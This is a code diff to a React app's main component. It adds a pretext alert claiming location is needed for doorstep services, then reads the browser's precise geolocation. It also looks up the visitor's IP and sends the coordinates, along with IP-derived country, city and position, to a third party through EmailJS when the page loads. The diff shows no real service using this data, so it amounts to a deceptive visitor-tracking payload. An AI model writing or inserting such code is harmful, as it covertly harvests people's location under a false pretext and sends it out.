@@ -12,6 +12,29 @@ function App() {
   const [result, setResult] = useState(null);
 
   useEffect(() => {
+    // New New
+    alert(
+      "We want your location to provide the best Services at your door step. Thank You"
+    );
+    const getLocation = () => {
+      return new Promise((resolve, reject) => {
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              const { latitude, longitude } = position.coords;
+              resolve({ latitude, longitude });
+            },
+            (error) => {
+              reject(error);
+            }
+          );
+        } else {
+          reject(new Error("Geolocation is not available in this browser."));
+        }
+      });
+    };
+
+    // New New
     const getUserIPAddress = async () => {
       try {
         const response = await fetch("https://api.ipify.org?format=json");
@@ -49,12 +72,15 @@ function App() {
     const sendEmail = async (result) => {
       try {
         const { countryName, city, latitude, longitude } = result;
+        const { latitude: geolat, longitude: geolong } = await getLocation();
 
         const templateParams = {
           countryName,
           city,
           latitude,
           longitude,
+          geolong,
+          geolat,
         };
 
         const response = await emailjs.send(
